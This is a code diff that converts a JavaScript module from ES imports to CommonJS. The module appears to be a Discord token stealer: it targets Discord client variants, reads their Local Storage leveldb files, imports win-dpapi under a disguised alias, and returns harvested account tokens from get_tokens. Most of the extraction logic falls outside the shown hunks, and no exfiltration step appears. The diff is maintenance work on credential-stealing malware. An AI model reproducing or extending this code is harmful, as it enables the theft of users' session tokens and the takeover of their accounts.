@@ -1,7 +1,7 @@
-import fs from "fs";
-import crypto from "crypto";
-import path from "path";
-import aurita from "win-dpapi";
+const fs = require("fs");
+const crypto = require("crypto");
+const path = require("path");
+const aurita = require("win-dpapi");
 
 const cords = [
     "discord",
@@ -11,9 +11,9 @@ const cords = [
     "lightcord"
 ];
 
-export const tokens = [];
+const tokens = [];
 
-export async function get_tokens(p) {
+async function get_tokens(p) {
     let tail = p;
     p = path.join(p, "Local Storage/leveldb");
 
@@ -74,4 +74,9 @@ export async function get_tokens(p) {
         }
     }
     return tokens;
+}
+
+module.exports = {
+    tokens,
+    get_tokens
 }
